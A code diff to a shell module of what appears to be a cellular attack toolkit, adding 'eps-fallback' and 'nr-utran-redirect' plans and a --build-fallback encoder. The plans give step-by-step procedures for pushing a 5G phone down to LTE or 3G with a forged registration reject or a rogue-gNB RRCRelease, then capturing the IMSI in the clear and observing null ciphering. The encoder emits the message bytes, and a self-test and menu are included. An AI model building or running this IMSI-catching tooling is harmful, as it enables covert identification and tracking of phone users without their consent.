@@ -1763,12 +1763,22 @@ dwn_plan() {
             need="A transmit-capable SDR — HackRF, BladeRF, USRP (B200/B210) or LimeSDR — plus srsRAN or OpenAirInterface able to broadcast a modified SIB1, and lawful authority for the band. An rtl-sdr cannot transmit. The SIB1 body itself is built offline by $0 --build-sib1."
             steps="1. Survey the target NR cell: SSB ARFCN and GSCN ($0 --path, 12_nr_air.sh --arfcn / --ssb).\n2. Build the substitute SIB1 with the real PLMN, TAC and cellIdentity of that cell, and cellBarred set: $0 --build-sib1 <mcc> <mnc> <tac> <cellid> barred notAllowed.\n3. Confirm the body decodes back to those fields: 10_lte_air.sh --decode-sib 1 <body>.\n4. Patch the SIB1 into the srsRAN/OAI broadcast configuration and re-broadcast on the same cell identity.\n5. Watch the UE: cellBarred makes it consider the NR cell unavailable, so look for the reselection to LTE (or to 2G/3G).\n6. Record the time from the modified broadcast to the reselection — the downshift window.\n7. Stop the broadcast and confirm the UE returns to NR."
             ;;
+        eps-fallback)
+            why="An NR UE hands a call to E-UTRAN because NR carries no circuit domain and an operator may keep the call off IMS over 5G. TS 23.502 4.13.2 makes that an explicit procedure rather than an accident: the core or the gNB moves the UE to EPC before the call continues. The same two messages are available to whoever can answer N1 or broadcast an RRCRelease, and they land the UE on the generation whose Attach can still ask for the IMSI in the clear."
+            need="Two halves, two owners, and either half works alone. Core half: an AMF that will emit 5GMM cause 31 (Redirection to EPC required) -- an Open5GS AMF with a patched registration handler, or a test AMF -- and an MME behind it. RAN half: a gNB able to send an RRCRelease with redirectedCarrierInfo=eutra -- srsRAN on a transmit SDR, or 55_nr_inject.sh for the message layer without a radio. Lawful authority for any band that is transmitted on."
+            steps="1. Build both halves offline and read them back: $0 --build-fallback --redirect eutra --arfcn <earfcn> --cause 31.\n2. Confirm the NAS half is a Registration reject with cause 31 (TS 24.501 9.11.3.2) and the RRC half is DL-DCCH RRCRelease.redirectedCarrierInfo=eutra; both are decoded by an independent implementation (pycrate) in --selftest.\n3. Survey the NR cell and pick the E-UTRAN carrier the UE should land on: 12_nr_air.sh --arfcn / --ssb and 10_lte_air.sh --scan.\n4. Confirm the target E-UTRA cell is actually receivable -- a redirect to a cell the UE cannot see ends in no service, not in a downshift.\n5. Send the core half (reject) or the RAN half (RRCRelease). They are independent; the reject needs no radio at all.\n6. Watch for the EPS Attach that follows and capture it on S1/N1.\n7. In the Attach, look for an Identity Request with the IMSI identity type. That is the exposure the chain was for, and it is why 15_downgrade.sh exists.\n8. Record the delay from the reject to the Attach: that is the downshift window."
+            ;;
+        nr-utran-redirect)
+            why="NR cannot redirect a UE to UTRAN. TS 38.331 RedirectedCarrierInfo is a CHOICE with exactly two root alternatives, nr and eutra, and no extension -- this module reads that out of pycrate's ASN.1 at run time, which is why --build-fallback --redirect utra refuses by name instead of encoding a field that does not exist. An NR-to-3G downshift is therefore two messages on two generations: an RRCRelease that lands the UE on E-UTRAN, then an E-UTRAN release (or an S1 handover) whose own RedirectedCarrierInfo carries utra-fdd or utra-tdd. CS fallback (TS 23.272) reaches the same place from an EPS Attach."
+            need="A gNB able to send the first RRCRelease (srsRAN with a transmit SDR, or 55_nr_inject.sh for the message layer), an eNB that will move the UE on to UTRAN (srsLTE/srsRAN with S1 to an MME, or a lab femto), and UTRAN coverage the UE can select. Lawful authority for both bands. Neither release needs a radio to be encoded."
+            steps="1. Encode leg one and read it back: $0 --build-fallback --redirect eutra --arfcn <earfcn>. The utra branch is refused by name -- do not patch a third alternative into the message, and do not believe a capture that claims one.\n2. Prepare leg two on E-UTRAN: an RRCConnectionRelease with redirectedCarrierInfo=utra-fdd (TS 36.331 6.2.2) carrying the UARFCN of the target cell, or an S1 handover to UTRAN.\n3. Confirm UTRAN coverage in the target area (34_umts_air.sh or a survey): a UE can only be redirected to a cell it can measure.\n4. Send leg one and confirm the UE attaches to E-UTRAN.\n5. Send leg two and confirm the UE selects the UTRAN cell.\n6. Capture the Location Updating Request on the legacy RAN, then the Identity Request with the IMSI identity type.\n7. Record the cipher mode command the RNC issues. UEA0/A5/0 is the null-cipher exposure --null-cipher-table describes, and it is the second half of the downgrade."
+            ;;
         sni5gect)
             why="5G conceals the permanent identifier with the SUCI, and the concealment works. What it does not cover is the shape of the conversation: the Registration Request is answered before AKA establishes anything, so a gNB that is not the real one can answer it. A reject moves the UE to a generation whose Attach still requests the IMSI in the clear, and the identity the concealment was protecting is read out of the generation the UE was pushed into."
             need="A fake gNB able to broadcast an SSB on the target PLMN and answer N1-NAS (srsRAN with a modified gNB, or a USRP B210 with 55_nr_inject.sh for the message layer), plus lawful authority for the band. No core network is needed: the reject is the attacker's own message, which is what makes this cheaper than steering a real AMF."
             steps="1. Decode a captured SUCI and name its concealment scheme: 58_suci_catcher.sh --parse <suci>. A null scheme means the SUPI is the value; a profile-A/B home key means the de-concealment is offline and needs the key.\n2. Confirm the target cell: PLMN, TAC and SSB ARFCN (12_nr_air.sh --arfcn / --ssb, and $0 --path steer-down for the cause table).\n3. Encode the reject offline and read the cause back: $0 --reject-cause 27 (and 31, and 22, to compare).\n4. Stand up the fake gNB on the same PLMN with an SSB stronger than the real cell's.\n5. Answer the Registration Request with the reject before any Security Mode Command. Do not run AKA — the reject lands in the window the protocol leaves open.\n6. Watch for the reselection to E-UTRAN and capture the EPS Attach that follows.\n7. In the Attach, look for an Identity Request with the IMSI identity type. That is the permanent identity, in the clear, on the generation the UE was pushed to."
             ;;
-        *) printf 'ERROR\tunknown plan: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect)\n' \\
+        *) printf 'ERROR\tunknown plan: %s (want steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect|eps-fallback|nr-utran-redirect)\n' \\
                "$(dwn_sanitize "$name")" >&2; return 2 ;;
     esac
     if ! cat > "$f" <<EOF
@@ -1984,7 +1994,7 @@ dwn_cmd_tx_reject() {
 dwn_cmd_plan() {
     local name="${1:-}"
     [[ -n "$name" ]] || {
-        printf 'ERROR\tusage: --plan <steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect>\n' >&2; return 2; }
+        printf 'ERROR\tusage: --plan <steer-down|jamming-suppress|cs-fallback|forged-sib|sni5gect|eps-fallback|nr-utran-redirect>\n' >&2; return 2; }
     dwn_plan "$name"
 }
 
@@ -2681,6 +2691,50 @@ FAKE
         | grep -c 'SoapySDRUtil')" "0"
     chk probe-bad-driver "$(dwn_sdr_probe rtl-sdr >/dev/null 2>&1; echo $?)" "1"
 
+    # 15. EPS fallback, both halves. The NAS half is the reject the core sends
+    #     (TS 24.501 9.11.3.2 cause 31, the trigger TS 23.502 4.13.2.2 names);
+    #     the RAN half is the RRCRelease whose redirectedCarrierInfo is the
+    #     eutra branch (TS 38.331 6.2.2), encoded against pycrate's ASN.1 and
+    #     re-decoded to the same octets there before it is printed.
+    out=$(dwn_cmd_build_fallback --redirect eutra --arfcn 6300 2>/dev/null)
+    chk fallback-direction    "$(fld "$out" direction)"         "5g-to-lte"
+    chk fallback-nas-cause    "$(fld "$out" nas_cause)"         "31"
+    chk fallback-nas-hex      "$(fld "$out" nas_msg_hex)"       "7E00441F"
+    chk fallback-rrc-choice   "$(fld "$out" redirect_choice)"   "eutra"
+    # The branch list is read out of the grammar, not asserted from memory.
+    chk fallback-branches     "$(fld "$out" redirect_branches)" "nr,eutra"
+    # The RRC half is either encoded and pinned to the octets pycrate produces,
+    # or reported unobserved with the reason. An unobserved that names what is
+    # missing is a legitimate answer; a made-up octet would not be.
+    case "$(fld "$out" rrc_state)" in
+        ok)
+            chk fallback-rrc-pdu    "$(fld "$out" rrc_pdu_hex)"      "1081031380"
+            chk fallback-rrc-bits   "$(fld "$out" rrc_pdu_bits)"     "40"
+            chk fallback-rrc-decode "$(fld "$out" rrc_decode_check)" "ok" ;;
+        unobserved)
+            chk fallback-rrc-grey   "$(fld "$out" reason_rrc | grep -c pycrate)" "1" ;;
+        *)
+            chk fallback-rrc-state  "$(fld "$out" rrc_state)" "ok-or-unobserved" ;;
+    esac
+    # NR RRC has no UTRAN branch: asking for one is refused by name, and the
+    # refusal says where the 3G leg actually lives instead of pretending.
+    local fb_out fb_rc
+    fb_out=$(dwn_cmd_build_fallback --redirect utra --arfcn 6300 2>&1); fb_rc=$?
+    chk fallback-utra-refused "$fb_rc" "1"
+    chk fallback-utra-reason  "$(printf '%s\n' "$fb_out" | grep -c 'no UTRAN redirection branch')" "1"
+    chk fallback-utra-twolog  "$(printf '%s\n' "$fb_out" | grep -c 'TS 36.331')" "1"
+    # Guards name what is missing: no arfcn, an arfcn outside the field's range,
+    # and a branch that does not exist are three different refusals.
+    chk fallback-arfcn-missing "$(dwn_cmd_build_fallback --redirect eutra >/dev/null 2>&1; echo $?)" "2"
+    chk fallback-arfcn-range   "$(dwn_cmd_build_fallback --redirect eutra --arfcn 3000000 >/dev/null 2>&1; echo $?)" "2"
+    chk fallback-nr-range      "$(dwn_cmd_build_fallback --redirect nr --arfcn 4000000 >/dev/null 2>&1; echo $?)" "2"
+    chk fallback-bad-branch    "$(dwn_cmd_build_fallback --redirect banana --arfcn 6300 >/dev/null 2>&1; echo $?)" "2"
+    chk fallback-missing-cause "$(dwn_cmd_build_fallback --redirect eutra --arfcn 6300 --cause 300 >/dev/null 2>&1; echo $?)" "1"
+    # The store is append-only and carries the branch that was built.
+    chk fallback-store-row "$(awk -F'\t' 'NR>1 && $2=="eutra"' \
+        "${DWN_DIR:-$LOOT_DIR/downgrade}/fallbacks.tsv" 2>/dev/null | wc -l | tr -d ' ')" "1"
+    chk fallback-plan-eps  "$(dwn_plan eps-fallback >/dev/null 2>&1; echo $?)"      "0"
+    chk fallback-plan-3g   "$(dwn_plan nr-utran-redirect >/dev/null 2>&1; echo $?)" "0"
     rm -rf "$d"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
@@ -2702,7 +2756,10 @@ dwn_menu() {
   [6]  plan: steer down (5G -> 4G)
   [7]  plan: jamming suppression
   [8]  plan: CS fallback (-> 2G/3G)
-  [9]  status
+  [9]  build an EPS-fallback command set (5G -> 4G)
+  [10] plan: EPS fallback (5G/NR -> LTE)
+  [11] plan: NR -> 3G redirection (two legs)
+  [12] status
   [0]  back
 
 M
@@ -2731,7 +2788,14 @@ M
             6) dwn_cmd_plan steer-down        | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
             7) dwn_cmd_plan jamming-suppress  | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
             8) dwn_cmd_plan cs-fallback       | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
-            9) dwn_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
+            9)
+                read -rp "  redirect (eutra|nr|utra)> " r
+                read -rp "  target arfcn (EARFCN for eutra, ARFCN for nr)> " a
+                dwn_cmd_build_fallback --redirect "${r:-eutra}" --arfcn "$a" | column -t -s$'\t' 2>/dev/null
+                read -rp "  press enter " _ ;;
+            10) dwn_cmd_plan eps-fallback      | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
+            11) dwn_cmd_plan nr-utran-redirect | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
+            12) dwn_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
             0) return ;;
             *) warn "invalid"; sleep 1 ;;
         esac
@@ -2839,6 +2903,306 @@ dwn_cmd_build_steer() {
 }
 
 # ── CLI dispatch ────────────────────────────────────────────────────────
+# ── EPS fallback: the NR -> LTE command set (TS 23.502 4.13, TS 38.331) ──
+# An NR UE reaches E-UTRAN two ways, and they are different messages with
+# different owners:
+#   core half  a 5GMM registration reject carrying cause 31 "Redirection to EPC
+#              required" (TS 24.501 9.11.3.2). This is the EPS-fallback trigger
+#              3GPP specifies in TS 23.502 4.13.2.2, and it needs no radio.
+#   RAN half   an RRCRelease whose redirectedCarrierInfo is the eutra branch
+#              (TS 38.331 6.2.2). This is what actually moves the UE once N1
+#              is gone, and it is emitted by the gNB, not the core.
+#
+# What the NR grammar does NOT have is a UTRAN branch. RedirectedCarrierInfo is
+# CHOICE { nr, eutra } with no extension -- a fact this module reads out of
+# pycrate's ASN.1 at run time rather than asserting from memory -- so an
+# "NR -> 3G redirection" cannot be one RRCRelease. It is two messages on two
+# generations, which is the nr-utran-redirect plan. --redirect utra refuses by
+# name instead of encoding a field that does not exist.
+#
+# The RRC half is encoded by pycrate, which vendors TS 38.331 as executable
+# ASN.1: an independent implementation of the specification, not this tree's
+# arithmetic read back to itself. The script is written out here rather than
+# added to tools/ because this module owns exactly one file.
+dwn_nr_rrc_py() {
+    local want="${DWN_NR_RRC_PY:-}" c
+    for c in "$want" "${LTE_ORACLE_PY:-}" \
+             "$HOME/.lte-oracles/venv/bin/python" \
+             "$IMSISTING_ROOT/tools/../.venv/bin/python3" \
+             "$IMSISTING_ROOT/venv/bin/python3" /tmp/pycvenv/bin/python3 \
+             python3; do
+        [[ -n "$c" ]] || continue
+        [[ -x "$c" || "$c" == "python3" ]] || continue
+        if "$c" -c 'from pycrate_asn1dir import RRCNR' >/dev/null 2>&1; then
+            printf '%s\n' "$c"; return 0
+        fi
+    done
+    return 1
+}
+
+dwn_nr_rrc_script() {
+    local dst="$1"
+    cat > "$dst" <<'DWN_NR_RRC'
+#!/usr/bin/env python3
+"""Encode the NR RRCRelease that redirects a UE, with pycrate's TS 38.331 grammar.
+
+pycrate vendors the NR RRC ASN.1 as executable code, so the octets below come
+from an independent implementation of the specification rather than from this
+tree's own arithmetic. The script reports which alternatives
+RedirectedCarrierInfo actually has -- read from the schema, never guessed --
+and re-decodes its own output to the same bytes before printing them.
+"""
+import sys
+
+
+def row(*v):
+    sys.stdout.write("\t".join(str(x) for x in v) + "\n")
+
+
+def grey(why):
+    row("rrc_state", "unobserved")
+    row("reason_rrc", why)
+    sys.exit(1)
+
+
+try:
+    from pycrate_asn1dir import RRCNR
+except Exception as exc:
+    grey("pycrate RRCNR is not importable (%s): the NR RRC grammar is vendored "
+         "by pycrate and this module does not re-implement TS 38.331 ASN.1 by "
+         "hand, so the RRC half is grey rather than guessed" % exc)
+
+ARGS = sys.argv[1:]
+branch, arfcn, tx, cn_type = "eutra", None, 0, ""
+i = 0
+while i < len(ARGS):
+    a = ARGS[i]
+    if a not in ("--branch", "--arfcn", "--tx", "--cn-type"):
+        grey("unknown argument %r" % a)
+    if i + 1 >= len(ARGS):
+        grey("%s needs a value" % a)
+    v = ARGS[i + 1]
+    if a == "--branch":
+        branch = v
+    elif a == "--arfcn":
+        arfcn = v
+    elif a == "--tx":
+        tx = v
+    else:
+        cn_type = v
+    i += 2
+
+try:
+    arfcn = int(arfcn)
+    tx = int(tx)
+except (TypeError, ValueError):
+    grey("--arfcn and --tx must be decimal integers")
+
+D = RRCNR.NR_RRC_Definitions
+CHOICE = D.RedirectedCarrierInfo
+ALTS = list(getattr(CHOICE, "_root", None) or [])
+row("rrc_schema", "pycrate RRCNR.NR_RRC_Definitions (vendored TS 38.331)")
+row("redirect_branches", ",".join(ALTS) if ALTS else "unobserved")
+row("redirect_choice", branch)
+if branch not in ALTS:
+    grey("RedirectedCarrierInfo is the CHOICE {%s} with no extension in the "
+         "grammar: %r is not a branch, so neither redirectedCarrierInfo nor any "
+         "other field of this message can carry it"
+         % (", ".join(ALTS), branch))
+
+alt = CHOICE.get_at([branch])
+freq = "eutraFrequency" if branch == "eutra" else "carrierFreq"
+try:
+    alt.get_at([freq])._safechk_bnd(arfcn)
+    row("redirect_arfcn_in_schema_range", "yes")
+except Exception as exc:
+    grey("%s is outside the range the grammar gives the field (%s: %s)"
+         % (freq, type(exc).__name__, exc))
+
+fields = {freq: arfcn}
+if branch == "eutra" and cn_type:
+    fields["cnType"] = cn_type
+try:
+    D.DL_DCCH_Message.set_val({"message": ("c1", ("rrcRelease", {
+        "rrc-TransactionIdentifier": tx,
+        "criticalExtensions": ("rrcRelease", {
+            "redirectedCarrierInfo": (branch, fields)}),
+    }))})
+    pdu = D.DL_DCCH_Message.to_uper()
+    if isinstance(pdu, tuple):  # pycrate returns octets, or (octets, nbits)
+        pdu = pdu[0]
+except Exception as exc:
+    grey("the grammar rejected the value (%s: %s)" % (type(exc).__name__, exc))
+
+row("rrc_pdu_hex", pdu.hex().upper())
+row("rrc_pdu_octets", len(pdu))
+row("rrc_pdu_bits", len(pdu) * 8)
+row("rrc_pdu_padding",
+    "to_uper() pads to whole octets, so the PDU is this octet string and the "
+    "bit count is octets x 8")
+try:
+    D.DL_DCCH_Message.from_uper(pdu)
+    D.DL_DCCH_Message.set_val(D.DL_DCCH_Message.get_val())
+    again = D.DL_DCCH_Message.to_uper()
+    if isinstance(again, tuple):
+        again = again[0]
+except Exception as exc:
+    grey("re-decode of the encoded bytes failed (%s: %s)"
+         % (type(exc).__name__, exc))
+row("rrc_decode_check", "ok" if again == pdu else "mismatch")
+row("rrc_fields", "message.c1.rrcRelease{ rrc-TransactionIdentifier=%d, "
+    "criticalExtensions.rrcRelease.redirectedCarrierInfo=%s }" % (tx, branch))
+if again != pdu:
+    grey("decode then re-encode produced different octets: %s" % again.hex().upper())
+row("rrc_state", "ok")
+sys.exit(0)
+DWN_NR_RRC
+}
+
+# dwn_nr_rrc_redirect <eutra|nr> <arfcn> [tx]: the RAN half of a fallback.
+dwn_nr_rrc_redirect() {
+    local branch="${1:-}" arfcn="${2:-}" tx="${3:-0}" py script out
+    if ! py=$(dwn_nr_rrc_py); then
+        printf 'rrc_state\tunobserved\n'
+        printf 'reason_rrc\tno interpreter with pycrate_asn1dir.RRCNR found (tried %s); the NR RRC grammar is vendored by pycrate and this module does not re-implement TS 38.331 ASN.1 by hand, so the RRC half is grey rather than guessed. Set DWN_NR_RRC_PY to an interpreter that has pycrate.\n' \
+            "$(dwn_sanitize "${DWN_NR_RRC_PY:-unset, LTE_ORACLE_PY, ~/.lte-oracles, .venv, venv, /tmp/pycvenv, python3}")"
+        return 1
+    fi
+    script="$MOD_TMP/nr_rrc_redirect.py"
+    dwn_nr_rrc_script "$script" || {
+        printf 'rrc_state\tunobserved\n'
+        printf 'reason_rrc\tcannot write the encoder script to %s\n' "$(dwn_sanitize "$script")"
+        return 1; }
+    if ! out=$("$py" "$script" --branch "$branch" --arfcn "$arfcn" --tx "$tx" 2>&1); then
+        printf '%s\n' "$out"
+        return 1
+    fi
+    printf '%s\n' "$out"
+    return 0
+}
+
+dwn_store_fallbacks() {
+    local d="${DWN_DIR:-$LOOT_DIR/downgrade}"
+    mkdir -p "$d" 2>/dev/null || return 1
+    printf '%s/fallbacks.tsv\n' "$d"
+}
+
+# --build-fallback: the whole EPS-fallback command set, both halves, offline.
+dwn_cmd_build_fallback() {
+    local redirect="eutra" arfcn="" cause="31" tx="0"
+    while (( $# )); do
+        case "$1" in
+            --redirect) redirect="${2:-}"; shift 2 ;;
+            --arfcn)    arfcn="${2:-}";    shift 2 ;;
+            --cause)    cause="${2:-}";    shift 2 ;;
+            --tx)       tx="${2:-}";       shift 2 ;;
+            -h|--help)
+                cat <<'EOF'
+usage: --build-fallback [--redirect eutra|nr|utra] --arfcn <n> [--cause <n>] [--tx <n>]
+  eutra  the 5GMM reject (cause 31 by default, TS 24.501 9.11.3.2) plus the
+         NR RRCRelease redirectedCarrierInfo=eutra (TS 38.331 6.2.2)
+  nr     the RRCRelease redirecting to another NR carrier; no NAS half exists
+         because there is no generation change to force
+  utra   refused by name: RedirectedCarrierInfo has no UTRAN branch, so NR->3G
+         is two messages (--plan nr-utran-redirect)
+EOF
+                return 0 ;;
+            -*) printf 'ERROR\tunknown option: %s\n' "$(dwn_sanitize "$1")" >&2; return 2 ;;
+            *)  printf 'ERROR\tunexpected argument: %s\n' "$(dwn_sanitize "$1")" >&2; return 2 ;;
+        esac
+    done
+    case "$redirect" in
+        eutra|nr) ;;
+        utra|utran|3g|3G)
+            printf 'ERROR\tNR RRC carries no UTRAN redirection branch\n' >&2
+            printf 'reason\tTS 38.331 RedirectedCarrierInfo is the CHOICE { nr, eutra } with no extension, and pycrate RRCNR reports exactly those two root alternatives, so an RRCRelease cannot point an NR UE at UTRAN. The 3G leg is a second message on a second generation: the E-UTRAN RRCConnectionRelease whose own RedirectedCarrierInfo carries utra-fdd or utra-tdd (TS 36.331 6.2.2), or CS fallback (TS 23.272). Run --plan nr-utran-redirect for the two-leg procedure. This module refuses to encode a field the grammar does not have.\n' >&2
+            return 1 ;;
+        *) printf 'ERROR\t--redirect must be eutra, nr or utra: %s\n' "$(dwn_sanitize "$redirect")" >&2; return 2 ;;
+    esac
+    [[ -n "$arfcn" ]] || {
+        printf 'ERROR\t--arfcn is required: the carrier the UE is redirected to (an E-UTRA EARFCN for eutra, an NR ARFCN for nr). It is not derivable from a capture here -- redirectedCarrierInfo is what the operator chooses.\n' >&2
+        return 2; }
+    [[ "$arfcn" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--arfcn must be a decimal number: %s\n' "$(dwn_sanitize "$arfcn")" >&2; return 2; }
+    local hi ref
+    if [[ "$redirect" == eutra ]]; then
+        hi=262143
+        ref="ARFCN-ValueEUTRA 0..maxEARFCN, maxEARFCN=262143 (TS 38.331 6.3.2 with TS 36.101)"
+    else
+        hi=3279165
+        ref="ARFCN-ValueNR 0..maxNARFCN, maxNARFCN=3279165 (TS 38.331 6.3.2 with TS 38.104)"
+    fi
+    (( arfcn <= hi )) || {
+        printf 'ERROR\t--arfcn %s is outside %s\n' "$(dwn_sanitize "$arfcn")" "$ref" >&2
+        return 2; }
+    [[ "$cause" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--cause must be a decimal number: %s\n' "$(dwn_sanitize "$cause")" >&2; return 2; }
+    [[ "$tx" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--tx must be a decimal number (rrc-TransactionIdentifier 0..3): %s\n' "$(dwn_sanitize "$tx")" >&2; return 2; }
+    (( tx <= 3 )) || {
+        printf 'ERROR\t--tx is the rrc-TransactionIdentifier, 0..3 in TS 38.331\n' >&2; return 2; }
+
+    local direction nas_hex="" nas_cause="" nas_rat="none" nas_mean=""
+    if [[ "$redirect" == eutra ]]; then
+        direction="5g-to-lte"
+        nas_rat="5GMM"
+        local nas_out
+        nas_out=$(dwn_nas_reject_build 5GMM "$cause" attach) || {
+            printf 'ERROR\t5GMM has no registration reject carrying cause %s\n' "$(dwn_sanitize "$cause")" >&2
+            printf 'reason\tTS 24.501 9.11.3.2 assigns the 5GMM causes and --causes lists the ones this module knows. Cause 31 is the one TS 23.502 4.13.2.2 names for EPS fallback.\n' >&2
+            return 1; }
+        nas_hex=$(printf '%s\n' "$nas_out" | awk -F'\t' '$1=="msg_hex"{print $2; exit}')
+        nas_cause=$(printf '%s\n' "$nas_out" | awk -F'\t' '$1=="cause"{print $2; exit}')
+        nas_mean=$(dwn_cause_name 5GMM "$nas_cause")
+    else
+        direction="5g-to-nr"
+    fi
+
+    printf 'verb\tbuild-fallback\n'
+    printf 'redirect_choice\t%s\n'   "$redirect"
+    printf 'redirect_arfcn\t%s\n'    "$arfcn"
+    printf 'arfcn_reference\t%s\n'   "$ref"
+    printf 'direction\t%s\n'         "$direction"
+    if [[ "$redirect" == eutra ]]; then
+        printf 'nas_rat\t%s\n'       "$nas_rat"
+        printf 'nas_kind\tattach\n'
+        printf 'nas_cause\t%s\n'     "$nas_cause"
+        printf 'nas_msg_hex\t%s\n'   "$nas_hex"
+        printf 'nas_mean\t%s\n'      "$(dwn_sanitize "$nas_mean")"
+        printf 'nas_owner\tcore: TS 24.501 9.11.3.2 cause 31, the EPS-fallback trigger of TS 23.502 4.13.2.2 (no radio involved)\n'
+        printf 'nas_referee\tpycrate_mobile.NAS -- the same hex is decoded and re-encoded by dwn_nas_decode_oracle in --selftest\n'
+    else
+        printf 'nas_state\tnot_applicable\n'
+        printf 'reason_nas\tredirecting an NR UE to another NR carrier is not a fallback: no generation change happens, so the RRC half is the whole message\n'
+    fi
+    printf 'rrc_message\tDL-DCCH-Message{ rrcRelease }\n'
+    printf 'rrc_ie\tredirectedCarrierInfo=%s\n' "$redirect"
+    printf 'rrc_owner\tRAN: TS 38.331 6.2.2, emitted by the gNB and independent of the NAS reject above\n'
+    local rrc_out rrc_rc rrc_hex rrc_state
+    rrc_out=$(dwn_nr_rrc_redirect "$redirect" "$arfcn" "$tx"); rrc_rc=$?
+    printf '%s\n' "$rrc_out"
+    rrc_hex=$(printf '%s\n' "$rrc_out" | awk -F'\t' '$1=="rrc_pdu_hex"{print $2; exit}')
+    rrc_state=$(printf '%s\n' "$rrc_out" | awk -F'\t' '$1=="rrc_state"{print $2; exit}')
+    printf 'utran_redirect\tunobserved\n'
+    printf 'reason_utran\tNR RRC has no UTRAN alternative in RedirectedCarrierInfo, so this message cannot redirect to 3G at all; the 3G leg belongs to the E-UTRAN cell (TS 36.331 6.2.2 utra-fdd/utra-tdd) or to CS fallback (TS 23.272). See --plan nr-utran-redirect.\n'
+    printf 'verdict\tfallback_command_set_built\n'
+
+    local store
+    if store=$(dwn_store_fallbacks); then
+        [[ -s "$store" ]] || printf 'ts\tbranch\tdirection\tarfcn\tnas_rat\tnas_cause\tnas_msg_hex\trrc_pdu_hex\trrc_state\n' > "$store"
+        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$redirect" "$direction" "$arfcn" \
+            "$nas_rat" "$nas_cause" "$nas_hex" "$rrc_hex" \
+            "${rrc_state:-unobserved}" >> "$store"
+    fi
+
+    if [[ "$rrc_state" != ok ]]; then
+        printf 'note\tthe NAS half above is real; the RRC half is grey, and the reason is printed with it\n' >&2
+        return 1
+    fi
+    return $rrc_rc
+}
+
 dwn_cli_main() {
     local cmd="${1:-}"
     (($# > 0)) && shift
@@ -2851,6 +3215,7 @@ dwn_cli_main() {
         --tx-reject)         dwn_cmd_tx_reject "${1:-}" "${2:-}" "${3:-attach}" ;;
         --build-sib1)        dwn_build_sib1 "${1:-001}" "${2:-01}" "${3:-1}" "${4:-0}" "${5:-barred}" "${6:-notAllowed}" ;;
         --build-steer)       dwn_cmd_build_steer "${1:-001}" "${2:-01}" "${3:-}" "${4:-15}" ;;
+        --build-fallback)    dwn_cmd_build_fallback "$@" ;;
         --detect)            dwn_cmd_detect "${1:-}" ;;
         --path)              dwn_cmd_path "${1:-}" ;;
         --plan)              dwn_cmd_plan "${1:-}" ;;
@@ -2882,6 +3247,16 @@ Usage: $0 COMMAND
   --build-steer <mcc> <mnc> <plmn,plmn,...> [cause]
                                   a reject carrying an Equivalent PLMN list:
                                   the network half of Steering of Roaming
+  --build-fallback [--redirect eutra|nr|utra] --arfcn <n> [--cause <n>] [--tx <n>]
+                                  the EPS-fallback command set: a 5GMM
+                                  registration reject (cause 31 by default,
+                                  TS 24.501 9.11.3.2) plus the NR RRCRelease
+                                  whose redirectedCarrierInfo is the eutra
+                                  branch (TS 38.331 6.2.2), encoded against
+                                  pycrate's ASN.1 and re-decoded before it is
+                                  printed. --redirect utra is refused by name:
+                                  NR RRC has no UTRAN branch, so the 3G leg is
+                                  --plan nr-utran-redirect (two messages).
   --detect <pcap|records.tsv>     find a downgrade: steering reject, RAT
                                   change, or a cipher change to null
   --path <name>                   describe a downgrade mechanism
@@ -2889,6 +3264,9 @@ Usage: $0 COMMAND
                                    forged-sib|sni5gect)
   --causes                        the full assigned cause table
   --plan <name>                   write a handoff plan naming the hardware
+                                  (steer-down|jamming-suppress|cs-fallback|
+                                   forged-sib|sni5gect|eps-fallback|
+                                   nr-utran-redirect)
   --selftest                      verify the tables and encoders without a radio
   --menu                          interactive menu
 
